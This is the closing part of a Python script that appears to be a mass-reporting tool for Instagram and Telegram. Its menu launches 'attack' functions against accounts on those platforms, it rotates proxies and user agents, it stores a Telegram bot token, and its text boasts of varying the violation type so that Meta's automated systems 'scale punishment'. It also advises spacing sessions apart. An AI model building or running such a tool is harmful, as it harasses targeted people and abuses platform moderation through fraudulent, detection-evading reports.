    print(f"     • Different violation type each round")
    print(f"     • Meta's automated systems scale punishment")
    print(f"")
    print(f"  {'─' * 50}")
    input("\n  Press Enter...")


# =============================================================================
#  MAIN
# =============================================================================
def main():
    global proxy_pool, TELEGRAM_BOT_TOKEN

    print(f"  [*] {VERSION} initializing...")
    print(f"  [*] {len(PROXY_SOURCES)} proxy sources loaded")
    print(f"  [*] {len(USER_AGENTS)} user agents loaded")
    print(f"  [*] {len(IG_FORM_URLS)} Instagram report forms loaded")

    # Load saved config
    try:
        if os.path.exists("ra_fa_config.txt"):
            with open("ra_fa_config.txt") as f:
                for line in f:
                    if line.startswith("TG_TOKEN="):
                        TELEGRAM_BOT_TOKEN = line.split("=", 1)[1].strip()
                        print(f"  [*] Loaded saved Telegram token")
    except:
        pass

    print("\n  [*] Fetching initial proxy pool...")
    fetch_and_test_proxies(min_working=30)

    # Save config
    try:
        with open("ra_fa_config.txt", "w") as f:
            f.write(f"TG_TOKEN={TELEGRAM_BOT_TOKEN}\n")
    except:
        pass

    while True:
        show_menu()
        choice = input("\n  [>] Select option: ").strip()

        if choice == "1":
            attack_ig()
        elif choice == "2":
            attack_tg()
        elif choice == "3":
            attack_both()
        elif choice == "4":
            config_tg()
            try:
                with open("ra_fa_config.txt", "w") as f:
                    f.write(f"TG_TOKEN={TELEGRAM_BOT_TOKEN}\n")
            except:
                pass
        elif choice == "5":
            refresh_proxies()
        elif choice == "6":
            show_stats()
        elif choice == "7":
            about()
        elif choice == "0":
            header()
            print(f"\n  👋 Goodbye! Remember: 3 sessions, 6-12h apart.\n")
            sys.exit(0)
        else:
            print("\n  [!] Invalid option, try again")
            time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n  [!] Error: {e}")
        sys.exit(1)
